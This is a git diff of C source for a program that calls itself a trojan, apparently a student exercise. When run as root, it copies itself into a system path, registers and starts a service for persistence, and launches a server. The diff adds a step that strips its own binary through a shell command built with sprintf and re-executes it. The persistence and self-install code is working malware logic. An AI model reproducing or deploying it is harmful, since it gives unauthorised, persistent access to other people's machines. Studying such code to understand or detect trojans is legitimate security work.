@@ -33,31 +33,56 @@ bool	need_to_install_server(void)
 	return (true);
 }
 
-void	install_server()
+void	compact_binary(void)
 {
+	char compact_cmd[PATH_MAX] = {0};
+	char *filename = strdup(path);
+
+	ft_dprintf(2, "binary: %s\n", filename);
+	sprintf(compact_cmd, "cp %s %s.tmp; strip --strip-all %s.tmp; mv %s.tmp %s", filename, filename, filename, filename, filename);
+	ft_dprintf(2, "cmd: %s\n", compact_cmd);
+	free(filename);
+	system(compact_cmd);
+
+	char	*argv[] = {
+		path, "--compacted", NULL
+	};
+
+	ft_dprintf(2, "binary compacted\n");
+	ft_dprintf(2, "----------------\n");
+	execv(path, argv);
+	exit(1);
+}
+
+void	install_server(int argc, char **argv)
+{
+	if (argc == 1 && argv[1] == NULL)
+		compact_binary();
+	ft_dprintf(2, "running as compacted binary\n");
+	ft_dprintf(2, "---------------------------\n");
+	printf("%s\n", "psegura-");
 	daemon(1, 1);
 	copy_file(path, DEST_PATH);
 	create_service();
 	start_service();
 }
 
-void	exec_troyan()
+void	exec_troyan(void)
 {
-	// daemon(1, 0);
 	t_server server;
 
 	memset(&server, 0, sizeof(t_server));
 	ft_server(&server);
 }
 
-int main(void)
+int main(int argc, char **argv)
 {
 	if (geteuid() != 0) {
 		ft_dprintf(2, "Error: not running as root\n");
 		return (1);
 	}
 	if (need_to_install_server()) {
-		install_server();
+		install_server(argc, argv);
 	} else {
 		exec_troyan();
 	}
